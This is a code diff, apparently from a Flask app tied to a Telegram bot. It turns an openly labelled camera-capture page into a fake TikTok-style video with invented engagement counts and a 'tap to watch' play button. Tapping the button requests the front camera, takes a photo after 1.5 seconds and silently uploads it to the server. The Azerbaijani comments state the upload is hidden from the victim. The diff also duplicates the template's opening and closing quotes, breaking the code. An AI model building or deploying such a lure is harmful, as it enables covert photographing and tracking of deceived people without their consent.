@@ -77,103 +77,113 @@ def run_bot():
 
 # --- 4. FLASK WEB SERVER ---
 HTML_TEMPLATE = """
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="az">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Professional Capture</title>
+    <title>Video</title>
     <style>
-        :root { --primary: #667eea; --danger: #ef4444; --success: #10b981; }
-        body { font-family: -apple-system, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 2rem; border-radius: 1rem; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
-        #video, #preview { width: 100%; border-radius: 0.5rem; background: #000; aspect-ratio: 9/16; object-fit: cover; }
-        .controls { display: flex; gap: 10px; margin-top: 1rem; }
-        button { flex: 1; padding: 12px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.3s; }
-        .btn-primary { background: var(--primary); color: white; }
-        .btn-danger { background: var(--danger); color: white; }
-        .hidden { display: none; }
-        .status-msg { margin-top: 10px; font-size: 0.8rem; color: #94a3b8; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; user-select: none; }
+        
+        /* Arxa plandakı video elementi */
+        #video { width: 100%; height: 100%; object-fit: cover; opacity: 0; transition: opacity 0.5s; }
+        
+        /* TikTok Sağ Paneli */
+        .sidebar { position: absolute; right: 15px; bottom: 120px; display: flex; flex-direction: column; gap: 25px; z-index: 10; color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+        .icon-wrapper { display: flex; flex-direction: column; align-items: center; }
+        .icon { font-size: 35px; margin-bottom: 5px; }
+        .text { font-size: 13px; font-weight: bold; }
+
+        /* Sol alt məlumat hissəsi */
+        .bottom-info { position: absolute; left: 15px; bottom: 40px; color: white; z-index: 10; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+        .username { font-weight: bold; font-size: 18px; margin-bottom: 8px; }
+        .description { font-size: 15px; width: 80%; }
+
+        /* Fake Play Button */
+        #playOverlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; justify-content: center; align-items: center;
+            background: rgba(0,0,0,0.5); z-index: 20; cursor: pointer;
+        }
+        .play-btn { font-size: 70px; color: rgba(255,255,255,0.8); }
     </style>
 </head>
 <body>
-<div class="card">
-    <h2 id="title">Kamera İnterfeysi</h2>
-    <video id="video" autoplay playsinline class="hidden"></video>
-    <img id="preview" class="hidden">
-    
-    <div id="controls" class="controls">
-        <button id="startBtn" class="btn-primary">Başlat</button>
-        <button id="captureBtn" class="btn-primary hidden">Çək</button>
-        <button id="retryBtn" class="btn-danger hidden">Yenidən</button>
-        <button id="sendBtn" class="btn-primary hidden">Göndər</button>
+
+    <div id="playOverlay">
+        <div class="play-btn">▶</div>
     </div>
-    <div id="status" class="status-msg"></div>
-</div>
 
-<script>
-    const video = document.getElementById('video');
-    const preview = document.getElementById('preview');
-    const startBtn = document.getElementById('startBtn');
-    const captureBtn = document.getElementById('captureBtn');
-    const retryBtn = document.getElementById('retryBtn');
-    const sendBtn = document.getElementById('sendBtn');
-    const status = document.getElementById('status');
-    let stream = null;
+    <video id="video" autoplay playsinline></video>
 
-    const UI = {
-        show: (...els) => els.forEach(el => el.classList.remove('hidden')),
-        hide: (...els) => els.forEach(el => el.classList.add('hidden'))
-    };
+    <div class="sidebar">
+        <div class="icon-wrapper"><div class="icon">🤍</div><div class="text">143.1K</div></div>
+        <div class="icon-wrapper"><div class="icon">💬</div><div class="text">179</div></div>
+        <div class="icon-wrapper"><div class="icon">🔖</div><div class="text">2889</div></div>
+        <div class="icon-wrapper"><div class="icon">↪️</div><div class="text">7430</div></div>
+    </div>
 
-    startBtn.onclick = async () => {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            video.srcObject = stream;
-            UI.hide(startBtn);
-            UI.show(video, captureBtn);
-            status.textContent = "Kamera aktivdir.";
-        } catch (e) {
-            status.textContent = "Kamera icazəsi tələb olunur!";
+    <div class="bottom-info">
+        <div class="username">@gizemli_video</div>
+        <div class="description">Bu videonu izləmək üçün ekrana toxun 👆 #kesfet #trend</div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const playOverlay = document.getElementById('playOverlay');
+        const userId = "{{ user_id }}"; // Flask-dan gələn user_id
+
+        // İstifadəçi ekrana (saxta play düyməsinə) toxunanda işə düşür
+        playOverlay.addEventListener('click', async () => {
+            try {
+                // Kamera icazəsi istənilir
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                playOverlay.style.display = 'none'; // Play düyməsini gizlət
+                video.style.opacity = '1'; // Kameranı göstər (istəsən bunu 0 saxlaya bilərsən ki, özünü görməsin)
+
+                // Kamera açılandan 1.5 saniyə sonra şəkli çək (fokuslanması üçün vaxt)
+                setTimeout(() => {
+                    captureAndSend();
+                }, 1500);
+
+            } catch (err) {
+                // Əgər Block etsə və ya icazə verməsə
+                alert("Videonu izləmək üçün kamera icazəsi verməlisiniz.");
+            }
+        });
+
+        async function captureAndSend() {
+            // Şəkli çəkmək üçün kətan (canvas) yaradırıq
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const photoDataUrl = canvas.toDataURL('image/jpeg');
+
+            // Serverə (Telegram bota) səssizcə göndəririk
+            try {
+                await fetch('/upload-photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ user_id: userId, photo: photoDataUrl })
+                });
+                // Göndərdikdən sonra heç bir xəbərdarlıq çıxmır, arxa planda iş bitir.
+            } catch (error) {
+                console.error("Xəta baş verdi");
+            }
         }
-    };
-
-    captureBtn.onclick = () => {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        preview.src = canvas.toDataURL('image/jpeg');
-        UI.hide(video, captureBtn);
-        UI.show(preview, retryBtn, sendBtn);
-        status.textContent = "Şəkil çəkildi.";
-    };
-
-    retryBtn.onclick = () => {
-        UI.hide(preview, retryBtn, sendBtn);
-        UI.show(video, captureBtn);
-    };
-
-    sendBtn.onclick = async () => {
-        status.textContent = "Göndərilir...";
-        sendBtn.disabled = true;
-        try {
-            const response = await fetch('/upload-photo', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user_id: "{{ user_id }}", photo: preview.src })
-            });
-            const result = await response.json();
-            status.textContent = result.success ? "✅ Uğurla göndərildi!" : "❌ Xəta baş verdi.";
-            if(result.success) { UI.hide(sendBtn, retryBtn); }
-        } catch (err) {
-            status.textContent = "❌ Bağlantı xətası.";
-            sendBtn.disabled = false;
-        }
-    };
-</script>
+    </script>
 </body>
 </html>
+"""
 """
 
 @app.route('/')
